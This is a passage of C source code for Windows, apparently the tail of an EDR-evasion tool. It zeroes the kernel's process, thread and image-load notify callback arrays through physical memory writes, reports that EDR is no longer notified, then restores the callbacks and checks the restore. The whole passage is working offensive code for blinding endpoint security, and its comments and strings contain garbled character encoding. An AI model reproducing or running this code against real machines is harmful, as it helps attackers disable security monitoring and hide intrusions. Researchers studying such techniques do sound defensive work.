    printf("  Press Enter to proceed, Ctrl+C to abort.\n");
    printf("=============================================================\n");
    fflush(stdout); getchar(); printf("\n");

    SetConsoleCtrlHandler(ctrl_handler,TRUE);

    /* â”€â”€ Zero arrays â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[5] Zeroing notify arrays...\n\n");
    for (int i = 0; i < N_ARRAYS; i++) {
        if (!g_arrays[i].array_va) continue;
        printf("  %s:\n", g_arrays[i].name);
        zero_array(&g_arrays[i]);
        printf("\n");
    }

    printf("[6] Cache eviction (multi-CCD)... ");fflush(stdout);
    cache_evict_multiccd();
    printf("done\n\n");

    /* â”€â”€ Summary â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("=============================================================\n");
    printf("  Kernel notify routines: DISABLED\n\n");
    for (int i = 0; i < N_ARRAYS; i++) {
        if (!g_arrays[i].array_va) continue;
        int cnt = 0;
        for (int j = 0; j < g_arrays[i].n_saved; j++)
            if (g_arrays[i].entries[j].zeroed) cnt++;
        printf("  %-40s  %d slot(s) cleared\n", g_arrays[i].name, cnt);
    }
    printf("\n");
    printf("  Effect:\n");
    printf("    Process creation â†’ EDR not notified\n");
    printf("    DLL/driver load  â†’ EDR not notified\n");
    printf("    Thread creation  â†’ EDR not notified\n\n");
    printf("  Press Enter to RESTORE.  Ctrl+C also restores.\n");
    printf("=============================================================\n");
    fflush(stdout); getchar();

    do_restore_all();

    /* â”€â”€ Verify restore â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[7] Verifying...\n");
    int v_ok=0,v_total=0;
    for (int i = 0; i < N_ARRAYS; i++) {
        for (int j = 0; j < g_arrays[i].n_saved; j++) {
            if (!g_arrays[i].entries[j].zeroed) continue;
            v_total++;
            uint64_t cur=0;
            if(phys_read(g_arrays[i].entries[j].entry_pa,&cur,8)&&
               cur==g_arrays[i].entries[j].orig_val) v_ok++;
        }
    }
    printf("    %d/%d entries restored\n\n",v_ok,v_total);
    if(v_ok<v_total) printf("[!] Some entries not verified â€” reboot recommended\n\n");

    printf("[+] Done. All notify callbacks re-registered.\n");
    CloseHandle(g_dev);
    return 0;
}
